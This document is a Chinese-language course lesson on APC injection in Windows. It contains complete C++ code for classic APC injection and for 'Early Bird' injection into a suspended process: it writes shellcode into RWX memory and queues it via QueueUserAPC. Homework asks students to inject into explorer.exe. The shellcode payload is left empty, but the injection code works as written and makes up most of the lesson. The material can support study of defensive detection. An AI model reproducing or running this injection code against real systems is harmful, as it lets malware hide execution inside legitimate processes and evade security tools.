# 课时35：APC注入

## 1. 课程目标

学习APC (Asynchronous Procedure Call) 注入技术。

---

## 2. APC原理

```
APC队列:
┌─────────────────────────────────────┐
│ 线程处于Alertable状态时             │
│ 会执行APC队列中的函数               │
└─────────────────────────────────────┘

Alertable等待函数:
- SleepEx
- WaitForSingleObjectEx
- WaitForMultipleObjectsEx
- SignalObjectAndWait
- MsgWaitForMultipleObjectsEx
```

---

## 3. 实现代码

### 3.1 基础APC注入

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = { /* ShellCode */ };

BOOL APCInject(DWORD dwPid) {
    printf("[*] APC注入到PID: %d\n", dwPid);
    
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess) {
        printf("[-] 打开进程失败\n");
        return FALSE;
    }
    
    // 2. 分配内存
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        printf("[-] 内存分配失败\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. 写入ShellCode
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);
    
    // 4. 枚举目标进程的线程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    
    BOOL bQueued = FALSE;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == dwPid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    // 5. 向线程队列添加APC
                    if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0)) {
                        printf("[+] APC已队列到线程: %d\n", te.th32ThreadID);
                        bQueued = TRUE;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    
    if (!bQueued) {
        printf("[-] 未能队列APC\n");
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] APC注入成功，等待线程进入alertable状态执行\n");
    
    CloseHandle(hProcess);
    return TRUE;
}
```

### 3.2 Early Bird APC注入

```cpp
#include <windows.h>

BOOL EarlyBirdAPC(LPCWSTR szTargetPath) {
    printf("[*] Early Bird APC注入\n");
    
    // 1. 创建挂起的进程
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(szTargetPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] 创建进程失败\n");
        return FALSE;
    }
    printf("[+] 进程已创建(挂起): PID=%d\n", pi.dwProcessId);
    
    // 2. 分配内存并写入ShellCode
    LPVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemote, shellcode, sizeof(shellcode), NULL);
    
    // 3. 队列APC（在进程初始化前）
    QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0);
    printf("[+] APC已队列\n");
    
    // 4. 恢复线程
    ResumeThread(pi.hThread);
    printf("[+] 线程已恢复，APC将在初始化时执行\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}
```

---

## 4. 课后作业

### 作业1：基础APC（必做）

1. 实现APC注入到explorer.exe
2. 验证ShellCode执行

### 作业2：Early Bird（进阶）

1. 实现Early Bird APC注入
2. 比较与普通APC的区别

---

## 5. 下一课预告

下一课我们将学习DLL劫持技术。
